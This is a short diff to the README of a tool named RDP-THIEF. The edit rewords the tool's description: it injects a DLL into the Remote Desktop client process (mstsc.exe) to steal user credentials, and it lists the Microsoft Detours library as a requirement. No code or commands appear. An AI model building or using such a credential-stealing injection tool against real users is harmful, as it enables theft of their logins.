@@ -1,5 +1,5 @@
 # RDP-THIEF
-RDP THIEF - inject dll to mstsc process and steal user credentials.
+RDP THIEF - inject dll to remote desktop process (mstsc.exe) and steal user credentials.
 
 ## Requierments:
 Microsoft Detours Library - https://github.com/microsoft/Detours
